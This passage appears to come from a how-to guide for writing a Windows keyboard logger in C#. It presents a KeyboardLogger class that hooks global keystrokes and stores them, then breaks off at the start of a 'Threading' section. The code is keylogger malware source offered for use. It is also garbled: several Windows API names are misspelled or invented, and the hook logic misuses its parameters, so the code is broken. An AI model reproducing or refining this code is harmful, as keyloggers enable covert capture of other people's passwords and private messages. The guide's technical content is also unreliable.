     using System.Windows.Input;
     using System.Windows.Forms;

     public class KeyboardLogger
     {
         private static Hook _hook;
         private static object _lock = new object();
         private static List<Keys> _keys = new List<Keys>();

         public static void StartLogging()
         {
             lock (_lock)
             {
                 if (_hook != null)
                     return;

                 _hook = SetWindowHookEx(WHF.WHOID_KEYBOARD, (IntPtr)KeyboardHookProc, 0, 0);
             }
         }

         private static IntPtr KeyboardHookProc(IntPtr hCode, int wParam, IntPtr lParam)
         {
             if (hCode == 0 && wParam == 256)
             {
                 lock (_lock)
                 {
                     var key = (Keys)GetAsyncKeyState((int)wParam);
                     if (key != 0)
                         _keys.Add(key);
                 }
             }
             return (IntPtr)0;
         }

         public static void StopLogging()
         {
             lock (_lock)
             {
                 if (_hook != null)
                 {
                     UnhookWindowsHook(_hook);
                     _hook = null;
                 }
             }
         }
     }
     ```

5. **Threading**:
   - **Background Thread**: Run the key checking in a separate thread to prevent UI freezes.
   - **Code Example**:
     ```csharp
     class Program
     {
